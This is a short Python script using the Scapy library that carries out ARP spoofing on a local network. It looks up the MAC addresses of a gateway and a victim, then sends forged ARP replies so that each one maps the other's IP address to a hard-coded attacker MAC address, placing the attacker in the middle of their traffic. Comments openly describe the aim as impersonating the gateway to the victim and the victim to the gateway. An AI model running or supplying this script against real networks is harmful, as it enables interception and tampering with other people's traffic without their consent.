from scapy.all import * 

#getting mac address of a machine using the ip
def get_mac_address(ip):

    result, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if result:
        return result[0][1].src
    
def gateway_spoof(ipGateway, ipAttacker, ipVictim, interface):

    macGateway = get_mac_address(ipGateway)
    macAttacker = '08:00:27:0B:33:F8'
    macVictim = get_mac_address(ipVictim)

    #telling the victim that we are the gateway
    arpVictim = Ether()/ARP()
    arpVictim[Ether].src = macAttacker
    arpVictim[ARP].hwsrc = macAttacker
    arpVictim[ARP].psrc = ipGateway
    arpVictim[ARP].hwdst = macVictim
    arpVictim[ARP].pdst = ipVictim

    #telling the gateway that we are the victim
    arpGateway = Ether()/ARP()
    arpGateway[Ether].src = macAttacker
    arpGateway[ARP].hwsrc = macAttacker
    arpGateway[ARP].psrc = ipVictim
    arpGateway[ARP].hwdst = macGateway
    arpGateway[ARP].pdst = ipGateway

    sendp(arpVictim, iface=interface)
    sendp(arpGateway, iface=interface)

    print("Target: {} - {} is-at {}".format(ipAttacker, ipGateway, macAttacker))
    print("Target: {} - {} is-at {}".format(ipAttacker, ipVictim, macAttacker))